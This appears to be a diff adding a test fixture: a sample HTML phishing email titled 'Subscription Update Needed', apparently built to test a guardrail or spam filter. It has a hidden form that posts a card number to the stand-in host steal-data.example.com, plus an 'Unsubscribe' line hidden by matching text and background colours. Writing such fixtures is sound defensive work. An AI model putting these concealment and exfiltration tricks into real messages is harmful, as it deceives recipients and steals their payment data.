@@ -1,0 +1,18 @@
+From: spam@test.com
+To: victim@test.com
+Subject: Subscription Update Needed
+Date: Sat, 23 Nov 2024 12:30:00 -0500
+Message-ID: <guardrail-hidden-form@test.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+  <body>
+    <p>We couldn't process your subscription. Confirm details below.</p>
+    <form action="http://steal-data.example.com" method="POST" style="display:none">
+      <input type="text" name="card" value="4111 1111 1111 1111">
+    </form>
+    <p style="color:#eee;background:#eee;">Unsubscribe</p>
+    <p>Thank you.</p>
+  </body>
+</html>
